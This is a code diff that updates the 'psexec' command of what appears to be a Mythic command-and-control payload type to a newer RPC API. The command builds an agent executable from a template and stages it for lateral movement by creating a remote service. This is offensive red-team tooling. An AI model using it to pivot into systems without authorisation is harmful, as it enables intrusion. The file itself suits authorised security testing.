@@ -1,9 +1,8 @@
-from CommandBase import *
+from mythic_payloadtype_container.MythicCommandBase import *
 import json
 from uuid import uuid4
-from MythicPayloadRPC import *
-from MythicFileRPC import *
-
+from mythic_payloadtype_container.MythicRPC import *
+import base64
 
 class PsExecArguments(TaskArguments):
 
@@ -39,7 +38,7 @@ class PsExecCommand(CommandBase):
     needs_admin = True
     help_cmd = "psexec (modal popup)"
     description = "Pivot to a machine by creating a new service and starting it."
-    version = 1
+    version = 2
     is_exit = False
     is_file_browse = False
     is_process_list = False
@@ -51,18 +50,22 @@ class PsExecCommand(CommandBase):
     attackmapping = []
 
     async def create_tasking(self, task: MythicTask) -> MythicTask:
-        gen_resp = await MythicPayloadRPC(task).build_payload_from_template(task.args.get_arg('template'),
-                                                                            description=task.operator + "'s psexec from task " + str(task.task_id))
+        temp = await MythicRPC().execute("get_payload", payload_uuid=task.args.get_arg("template"))
+        gen_resp = await MythicRPC().execute("create_payload_from_uuid",
+                                             task_id=task.id,
+                                             payload_uuid=task.args.get_arg('template'),
+                                             new_description="{}'s psexec from task {}".format(task.operator, str(task.id)))
         if gen_resp.status == MythicStatus.Success:
             # we know a payload is building, now we want it
             while True:
-                resp = await MythicPayloadRPC(task).get_payload_by_uuid(gen_resp.uuid)
+                resp = await MythicRPC().execute("get_payload", payload_uuid=gen_resp.response["uuid"])
                 if resp.status == MythicStatus.Success:
                     if resp.build_phase == 'success':
                         if len(resp.contents) > 1 and resp.contents[:2] != b"\x4d\x5a":
                             raise Exception("psexec requires a payload executable, but got unknown type.")
                         # it's done, so we can register a file for it
-                        task.args.add_arg("template", resp.agent_file_id)
+                        task.args.add_arg("template", resp.response["file"]["agent_file_id"])
+                        task.display_params = "Uploading payload '{}' to {} on {} and creating service '{}'".format(temp.response['tag'], task.args.get_arg("remote_path"), task.args.get_arg("computer"), task.args.get_arg("service_name"))
                         break
                     elif resp.build_phase == 'error':
                         raise Exception("Failed to build new payload: {}".format(resp.error_message))
@@ -74,9 +77,9 @@ class PsExecCommand(CommandBase):
                     raise Exception(resp.error_message)
         else:
             raise Exception("Failed to start build process")
-        
-        
-        
+
+
+
         return task
 
     async def process_response(self, response: AgentResponse):
